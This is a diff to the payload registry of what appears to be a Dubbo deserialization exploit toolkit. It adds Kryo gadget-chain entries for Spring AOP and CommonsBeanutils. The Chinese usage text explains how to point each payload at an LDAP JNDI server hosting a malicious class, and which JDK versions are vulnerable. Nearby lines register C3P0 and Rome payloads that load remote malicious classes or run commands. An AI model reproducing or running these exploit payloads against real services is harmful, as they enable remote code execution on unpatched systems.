@@ -56,6 +56,8 @@ public enum Payloads {
   C3P0("C3P0", 2, new C3P0(), "arg[0]=恶意类所在web服务器ip，例：http://127.0.0.1:8080/，arg[1]=恶意类类名，此处需要恶意类无包名编译出来的", "java", "com.mchange:c3p0:0.9.5.2  com.mchange:mchange-commons-java:0.2.11", CheckParams.CODEBASE),
   ROME_JAVA("rome_java", 1, new Rome(), "arg[0]=cmd", "java", "com.rometools:rome:*", CheckParams.CMD),
 
+  SPRING_AOP_KRYO("spring-aop", 1, new com.threedr3am.exp.dubbo.payload.kryo.SpringAbstractBeanFactoryPointcutAdvisorPoc (), "arg[0]=ldap引用外部class地址，例：ldap://127.0.0.1:43658/Calc（ldap协议的JNDI服务可打jdk8u191及以下版本，大于jdk8u191需要使用gadget字节码）", "kryo", "org.springframework:spring-aop     受Spring版本限制", CheckParams.JNDI),
+  CommonsBeanutils_KRYO("CommonsBeanutils", 1, new com.threedr3am.exp.dubbo.payload.kryo.CommonsBeanutils(), "arg[0]=ldap引用外部class地址，例：ldap://127.0.0.1:43658/Calc（ldap协议的JNDI服务可打jdk8u191及以下版本，大于jdk8u191需要使用gadget字节码）", "kryo", "", CheckParams.JNDI),
   ;
 
   private String name;
